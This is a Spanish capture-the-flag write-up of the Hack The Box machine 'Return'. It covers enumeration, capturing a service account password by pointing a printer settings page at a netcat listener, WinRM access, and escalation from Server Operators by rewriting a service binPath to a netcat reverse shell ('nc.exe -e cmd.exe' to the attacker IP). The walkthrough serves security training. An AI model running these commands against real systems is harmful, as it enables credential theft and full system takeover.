---
layout: single
title: Hack The Box - Return
excerpt: "Es una máquina fácil de HackTheBox que explota una mala configuración para obtener credenciales y un acceso inicial. Hay que prestar atención a los detalles; la escalación de privilegios se logra abusando del grupo Server Operators."
date: 2025-13-10
classes: wide
header:
  teaser: /assets/images/htb-writeup-Return/return.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - Hack The Box
   
tags:  
  - Service Configuration Manipulation 
  - Server Operators group

---
<style>
  body {
    margin: 0;
    padding: 0;
    background-color: #0b101b;
    font-family: Arial, sans-serif;
    color: white;
  }

  /* Centramos únicamente los elementos visuales */
  .glitch,
  .title,
  .date,
  .info {
    text-align: center;
    margin-left: auto;
    margin-right: auto;
  }

  .glitch {
    position: relative;
    width: 90%;
    max-width: 400px;
    height: 300px;
    background-image: url("/assets/images/hhtb-writeup-Return/return.png");
    background-size: cover;
    background-position: center;
    margin: 2rem auto 1rem auto;
    overflow: hidden;
  }

  .glitch:before {
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background-image: url("/assets/images/htb-writeup-Return/return.png");
    background-size: cover;
    background-position: center;
    opacity: 0.5;
    mix-blend-mode: hard-light;
    animation: glitch2 10s linear infinite;
  }

  .glitch:hover:before {
    animation: glitch1 1s linear infinite;
  }

  @keyframes glitch1 {
    0% { background-position: 0 0; filter: hue-rotate(0deg); }
    10% { background-position: 5px 0; }
    20% { background-position: -5px 0; }
    30% { background-position: 15px 0; }
    40% { background-position: -5px 0; }
    50% { background-position: -25px 0; }
    60% { background-position: -50px 0; }
    70% { background-position: 0 -20px; }
    80% { background-position: -60px -20px; }
    81% { background-position: 0 0; }
    100% { background-position: 0 0; filter: hue-rotate(360deg); }
  }

  @keyframes glitch2 {
    0% { background-position: 0 0; filter: hue-rotate(0deg); }
    10% { background-position: 15px 0; }
    15% { background-position: -15px 0; }
    20% { filter: hue-rotate(360deg); }
    25% { background-position: 0 0; filter: hue-rotate(0deg); }
    100% { background-position: 0 0; filter: hue-rotate(0deg); }
  }

  .title {
    font-size: 1.5rem;
    font-weight: bold;
    margin-bottom: 0.5rem;
  }

  .date {
    font-size: 1rem;
    color: #ccc;
    margin-bottom: 1rem;
  }

  .info {
    display: flex;
    justify-content: center;
    gap: 2rem;
    flex-wrap: wrap;
    margin-top: 1rem;
    font-size: 0.9rem;
  }

  .info div {
    text-align: center;
  }

  .info .label {
    color: #999;
    font-size: 0.8rem;
  }

  .icon {
    font-size: 2rem;
    color: #0f0;
    margin: 0.5rem 0;
  }

  /* Responsive */
  @media (max-width: 575.5px) {
    .glitch {
      height: 200px;
    }
    .title {
      font-size: 1.3rem;
    }
  }
</style>

<body>
    <div class="glitch">  
    </div>
</body>

<br>

`Return` es una máquina fácil de HackTheBox que explota una mala configuración para obtener credenciales y un acceso inicial. Hay que prestar atención a los detalles; la escalación de privilegios se logra abusando del grupo Server Operators.

## Enumeración

Realizando un escaneo de puertos TCP identifique los siguientes abiertos:

```bash
Nmap scan report for 10.10.11.108
Host is up, received user-set (0.18s latency).
Scanned at 2025-08-22 12:57:36 EDT for 64s

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-08-22 17:16:18Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49671/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49674/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49679/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49682/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49694/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
56499/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows
```
Mediante este tipo de escaneo pude identificar el dominio de la maquina  `return.local` mismo que agregué al archivo `etc/hosts`, apuntándolo a la IP de la máquina víctima para evitar errores en futuros ataques o poder visualizar correctamente los sitios web.

```bash
┌──(root㉿kali)-[/opt]
└─# cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
10.10.11.108 return.local
```
![](/assets/images/htb-writeup-Return/web.png)

De las primeras acciones que realice fue enumerar las tecnologías implementadas en el sitio web con wappalyzer 

![](/assets/images/htb-writeup-Return/wa.png)

Posteriormente realicé un escaneo de directorios en donde al consultar `settings.php` se puede obtener otro subdominio e información de autenticación para el servicio ldap

```bash
┌──(root㉿kali)-[/opt]
└─# gobuster dir -u http://return.local/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://return.local/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 150] [--> http://return.local/images/]
/index.php            (Status: 200) [Size: 28274]
/Images               (Status: 301) [Size: 150] [--> http://return.local/Images/]
/Index.php            (Status: 200) [Size: 28274]
/settings.php         (Status: 200) [Size: 29090]
```
![](/assets/images/htb-writeup-Return/settings.png)

Agregue este nuevo dominio a mi archivo `etc/hosts` 

```bash
┌──(root㉿kali)-[/opt]
└─# cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
10.10.11.108 return.local printer.return.local
```
Me di cuenta que podía enumerar el servicio ldap sin proporcionar credenciales, sin embargo al intentar enumeración para volcar usuarios o alguna información sensible no obtuve nada relevante

```bash
┌──(root㉿kali)-[/opt]
└─# ldapsearch -x -H ldap://printer.return.local:389 -b "" -s base "(objectclass=*)"     
# extended LDIF
#
# LDAPv3
# base <> with scope baseObject
# filter: (objectclass=*)
# requesting: ALL
#

#
dn:
domainFunctionality: 7
forestFunctionality: 7
domainControllerFunctionality: 7
rootDomainNamingContext: DC=return,DC=local
ldapServiceName: return.local:printer$@RETURN.LOCAL
isGlobalCatalogReady: TRUE
supportedSASLMechanisms: GSSAPI
supportedSASLMechanisms: GSS-SPNEGO
supportedSASLMechanisms: EXTERNAL
supportedSASLMechanisms: DIGEST-MD5
supportedLDAPVersion: 3
supportedLDAPVersion: 2
supportedLDAPPolicies: MaxPoolThreads
supportedLDAPPolicies: MaxPercentDirSyncRequests
supportedLDAPPolicies: MaxDatagramRecv
supportedLDAPPolicies: MaxReceiveBuffer
supportedLDAPPolicies: InitRecvTimeout
supportedLDAPPolicies: MaxConnections
supportedLDAPPolicies: MaxConnIdleTime
supportedLDAPPolicies: MaxPageSize
supportedLDAPPolicies: MaxBatchReturnMessages
supportedLDAPPolicies: MaxQueryDuration
supportedLDAPPolicies: MaxDirSyncDuration
supportedLDAPPolicies: MaxTempTableSize
supportedLDAPPolicies: MaxResultSetSize
supportedLDAPPolicies: MinResultSets
supportedLDAPPolicies: MaxResultSetsPerConn
supportedLDAPPolicies: MaxNotificationPerConn
supportedLDAPPolicies: MaxValRange
supportedLDAPPolicies: MaxValRangeTransitive
supportedLDAPPolicies: ThreadMemoryLimit
supportedLDAPPolicies: SystemMemoryLimitPercent
supportedControl: 1.2.840.113556.1.4.319
supportedControl: 1.2.840.113556.1.4.801
supportedControl: 1.2.840.113556.1.4.473
supportedControl: 1.2.840.113556.1.4.528
supportedControl: 1.2.840.113556.1.4.417
supportedControl: 1.2.840.113556.1.4.619
supportedControl: 1.2.840.113556.1.4.841
supportedControl: 1.2.840.113556.1.4.529
supportedControl: 1.2.840.113556.1.4.805
supportedControl: 1.2.840.113556.1.4.521
supportedControl: 1.2.840.113556.1.4.970
supportedControl: 1.2.840.113556.1.4.1338
supportedControl: 1.2.840.113556.1.4.474
supportedControl: 1.2.840.113556.1.4.1339
supportedControl: 1.2.840.113556.1.4.1340
supportedControl: 1.2.840.113556.1.4.1413
supportedControl: 2.16.840.1.113730.3.4.9
supportedControl: 2.16.840.1.113730.3.4.10
supportedControl: 1.2.840.113556.1.4.1504
supportedControl: 1.2.840.113556.1.4.1852
supportedControl: 1.2.840.113556.1.4.802
supportedControl: 1.2.840.113556.1.4.1907
supportedControl: 1.2.840.113556.1.4.1948
supportedControl: 1.2.840.113556.1.4.1974
supportedControl: 1.2.840.113556.1.4.1341
supportedControl: 1.2.840.113556.1.4.2026
supportedControl: 1.2.840.113556.1.4.2064
supportedControl: 1.2.840.113556.1.4.2065
supportedControl: 1.2.840.113556.1.4.2066
supportedControl: 1.2.840.113556.1.4.2090
supportedControl: 1.2.840.113556.1.4.2205
supportedControl: 1.2.840.113556.1.4.2204
supportedControl: 1.2.840.113556.1.4.2206
supportedControl: 1.2.840.113556.1.4.2211
supportedControl: 1.2.840.113556.1.4.2239
supportedControl: 1.2.840.113556.1.4.2255
supportedControl: 1.2.840.113556.1.4.2256
supportedControl: 1.2.840.113556.1.4.2309
supportedControl: 1.2.840.113556.1.4.2330
supportedControl: 1.2.840.113556.1.4.2354
supportedCapabilities: 1.2.840.113556.1.4.800
supportedCapabilities: 1.2.840.113556.1.4.1670
supportedCapabilities: 1.2.840.113556.1.4.1791
supportedCapabilities: 1.2.840.113556.1.4.1935
supportedCapabilities: 1.2.840.113556.1.4.2080
supportedCapabilities: 1.2.840.113556.1.4.2237
subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=return,DC=local
serverName: CN=PRINTER,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Confi
 guration,DC=return,DC=local
schemaNamingContext: CN=Schema,CN=Configuration,DC=return,DC=local
namingContexts: DC=return,DC=local
namingContexts: CN=Configuration,DC=return,DC=local
namingContexts: CN=Schema,CN=Configuration,DC=return,DC=local
namingContexts: DC=DomainDnsZones,DC=return,DC=local
namingContexts: DC=ForestDnsZones,DC=return,DC=local
isSynchronized: TRUE
highestCommittedUSN: 102555
dsServiceName: CN=NTDS Settings,CN=PRINTER,CN=Servers,CN=Default-First-Site-Na
 me,CN=Sites,CN=Configuration,DC=return,DC=local
dnsHostName: printer.return.local
defaultNamingContext: DC=return,DC=local
currentTime: 20250822191335.0Z
configurationNamingContext: CN=Configuration,DC=return,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

Consulta para tratar de enumerar usuarios: 

```bash
┌──(root㉿kali)-[/home/kali]
└─# ldapsearch -x -H ldap://printer.return.local:389 -D "svc-printer" -w "" -b "DC=return,DC=local" "(objectClass=user)" sAMAccountName 

# extended LDIF
#
# LDAPv3
# base <DC=return,DC=local> with scope subtree
# filter: (objectClass=user)
# requesting: sAMAccountName 
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A37, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4563

# numResponses: 1
```
En este punto estuve un rato atorado creyendo que al cambiar la contraseña del usuario svc-printer podía enumerar algún servicio como LDAP, SMB o alguno similar, sin embargo decidí capturar con burp la petición de actualización en `settings.php`
y me di cuenta que solo se manda el parámetro ip con el dominio `printer.return.local` como valor

![](/assets/images/htb-writeup-Return/ip.png)

En este punto intente probar payloads para lograr un OS command injection sin embargo tampoco funciono

![](/assets/images/htb-writeup-Return/ip2.png)

Lo siguiente que probé fue cambiar el dominio printer.return.local  por mi IP y colocar un listener en el puerto 389 para validar si se realiza una conexión o envió de algún tipo de información 

![](/assets/images/htb-writeup-Return/ip3.png)

```bash
┌──(root㉿kali)-[/home/kali]
└─# nc -lvp 389                                                   
listening on [any] 389 ...
connect to [10.10.16.2] from printer.return.local [10.10.11.108] 62422
0*`%return\svc-printer�
                       1edFg43012!!
```

En este punto parece que recibí una contraseña, así que lo valide con netexec y funcionaron para SMB pero obtuve un pwned con winrm

```bash
┌──(root㉿kali)-[/home/kali]
└─# nxc smb 10.10.11.108 -u 'svc-printer' -p '1edFg43012!!'
SMB         10.10.11.108    445    PRINTER          [*] Windows 10 / Server 2019 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False)
SMB         10.10.11.108    445    PRINTER          [+] return.local\svc-printer:1edFg43012!! 
                                                                                                                                             
┌──(root㉿kali)-[/home/kali]
└─# nxc winrm 10.10.11.108 -u 'svc-printer' -p '1edFg43012!!'
WINRM       10.10.11.108    5985   PRINTER          [*] Windows 10 / Server 2019 Build 17763 (name:PRINTER) (domain:return.local)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.10.11.108    5985   PRINTER          [+] return.local\svc-printer:1edFg43012!! (Pwn3d!)
```

Finalmente, entre a la maquina con evil-winrm

```bash    
┌──(root㉿kali)-[/home/kali]
└─# evil-winrm -i 10.10.11.108 -u 'svc-printer' -p '1edFg43012!!'
 
Evil-WinRM shell v3.7
 
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
  
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-printer\Documents> whoami
return\svc-printer
*Evil-WinRM* PS C:\Users\svc-printer\Documents> 
```
## Escalada de privilegios

Enumerando los privilegios de mi usuario veo que tiene habilitado `SeLoadDriverPrivilege`  

```bash
*Evil-WinRM* PS C:\Programdata> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== =======
SeMachineAccountPrivilege     Add workstations to domain          Enabled
SeLoadDriverPrivilege         Load and unload device drivers      Enabled
SeSystemtimePrivilege         Change the system time              Enabled
SeBackupPrivilege             Back up files and directories       Enabled
SeRestorePrivilege            Restore files and directories       Enabled
SeShutdownPrivilege           Shut down the system                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
SeTimeZonePrivilege           Change the time zone                Enabled
```

Intente seguir esta [PoC](https://github.com/JoshMorrison99/SeLoadDriverPrivilege)  para poder escalar privilegios abusando de este privilegio, sin embargo no tuve éxito

```bash
*Evil-WinRM* PS C:\Programdata> .\eoploaddriver_x64.exe System\CurrentControlSet\MyService C:\Programdata\Capcom.sys
RegCreateKeyEx failed: 0x0
[+] Enabling SeLoadDriverPrivilege
[+] SeLoadDriverPrivilege Enabled
[+] Loading Driver: \Registry\User\S-1-5-21-3750359090-2939318659-876128439-1103\System\CurrentControlSet\MyService
NTSTATUS: c00000e5, WinError: 0

*Evil-WinRM* PS C:\Programdata> .\ExploitCapcom.exe
[+] No path was given. Default path C:\ProgramData\rev.exe
[*] Capcom.sys exploit
[-] CreateFile failed
```

Seguí enumerando el usuario `svc-printer` y me di cuenta que el usuario pertenecía al grupo `Server Operators`

```bash
*Evil-WinRM* PS C:\Programdata> net user svc-printer
User name                    svc-printer
Full Name                    SVCPrinter
Comment                      Service Account for Printer
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            5/26/2021 1:15:13 AM
Password expires             Never
Password changeable          5/27/2021 1:15:13 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   8/22/2025 11:18:20 AM

Logon hours allowed          All

Local Group Memberships      *Print Operators      *Remote Management Use
                             *Server Operators
Global Group memberships     *Domain Users
The command completed successfully.
```

Esto fue una vía potencial para escalar privilegios ya que cuando un usuario pertenece a este grupo puede logearse a un servicio de forma interactiva, ejecutar y detener un servicio. Detener y ejecutar un servicio nuevamente es algo crucial para poder escalar privilegios  ya que puede cambiarse su configuración. Primero liste los servicios de la maquina:

```bash
*Evil-WinRM* PS C:\Programdata> services

Path                                                                                                                 Privileges Service          
----                                                                                                                 ---------- -------          
C:\Windows\ADWS\Microsoft.ActiveDirectory.WebServices.exe                                                                  True ADWS             
\??\C:\ProgramData\Microsoft\Windows Defender\Definition Updates\{5533AFC7-64B3-4F6E-B453-E35320B35716}\MpKslDrv.sys       True MpKslceeb2796    
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe                                                              True NetTcpPortSharing
C:\Windows\SysWow64\perfhost.exe                                                                                           True PerfHost         
"C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"                                                False Sense            
C:\Windows\servicing\TrustedInstaller.exe                                                                                 False TrustedInstaller 
"C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"                                                     True VGAuthService    
"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"                                                                        True VMTools          
"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2104.14-0\NisSrv.exe"                                             True WdNisSvc         
"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2104.14-0\MsMpEng.exe"                                            True WinDefend        
"C:\Program Files\Windows Media Player\wmpnetwk.exe"                                                                      False WMPNetworkSvc 
```
Después cargue netcat a la maquina victima 

```bash
*Evil-WinRM* PS C:\Programdata> upload nc.exe
                                        
Info: Uploading /home/kali/nc.exe to C:\Programdata\nc.exe
                                        
Data: 79188 bytes of 79188 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Programdata> dir


    Directory: C:\Programdata


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d---s-        5/20/2021  12:07 PM                Microsoft
d-----        9/27/2021   4:46 AM                Package Cache
d-----        8/22/2025   1:05 PM                regid.1991-06.com.microsoft
d-----        9/15/2018  12:19 AM                SoftwareDistribution
d-r---        5/26/2021   2:36 AM                temp
d-----        9/15/2018  12:19 AM                USOPrivate
d-----        5/20/2021  12:11 PM                USOShared
d-----        9/27/2021   4:46 AM                VMware
-a----        8/22/2025   5:14 PM          59392 nc.exe

*Evil-WinRM* PS C:\Programdata> 
```

Reemplace el path del servicio para que al detenerlo e iniciarlo nuevamente ejecute una reverse shell con netcat

```bash
*Evil-WinRM* PS C:\Programdata> sc.exe config VMTools binPath="C:\Programdata\nc.exe -e cmd.exe 10.10.16.2 443" 
[SC] ChangeServiceConfig SUCCESS
*Evil-WinRM* PS C:\Programdata> sc.exe stop VMTools

SERVICE_NAME: VMTools
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 1  STOPPED
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
*Evil-WinRM* PS C:\Programdata> sc.exe start VMTools
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.

*Evil-WinRM* PS C:\Programdata> 
```

```bash
┌──(root㉿kali)-[/opt]
└─# nc -lvp 443
listening on [any] 443 ...
connect to [10.10.16.2] from printer.return.local [10.10.11.108] 57189
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>
```
